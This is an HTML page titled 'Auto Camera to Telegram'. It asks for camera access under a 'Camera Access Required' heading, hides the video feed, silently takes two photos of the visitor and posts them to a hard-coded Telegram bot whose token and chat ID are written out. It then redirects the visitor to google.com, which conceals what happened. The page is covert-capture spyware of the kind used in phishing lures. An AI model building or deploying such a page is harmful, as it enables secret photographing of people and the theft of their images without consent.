<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Camera to Telegram</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 40px; }
    video, canvas { display: none; }
    #status { font-size: 18px; margin-top: 20px; color: green; }
  </style>
</head>
<body>
  <h1>Camera Access Required</h1>
  <p id="status">Please allow camera access...</p>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
    const chatId = "7009447523"; // Your latest chat ID

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status');

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.jpg');

      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const result = await response.json();
        console.log("Telegram response:", result);
        if (result.ok) {
          statusText.textContent = "‚úÖ Photo sent to Telegram!";
        } else {
          statusText.textContent = "‚ùå Telegram error: " + result.description;
        }
      } catch (error) {
        console.error("Fetch error:", error);
        statusText.textContent = "‚ùå Network or API error";
      }
    }

    function captureAndSend() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        if (blob && blob.size > 0) {
          sendPhoto(blob);
        } else {
          statusText.textContent = "‚ùå Failed to capture photo";
        }
      }, 'image/jpeg');
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        statusText.textContent = "üì∑ Camera active. Capturing...";

        // Take 2 photos and then redirect
        setTimeout(() => {
          captureAndSend(); // 1st photo
          setTimeout(() => {
            captureAndSend(); // 2nd photo
            setTimeout(() => {
              window.location.href = "https://google.com"; // REDIRECT HERE
            }, 1500);
          }, 1500);
        }, 3000);
      })
      .catch(error => {
        console.error("Camera error:", error);
        statusText.textContent = "‚ùå Camera access denied";
      });
  </script>
</body>
</html>
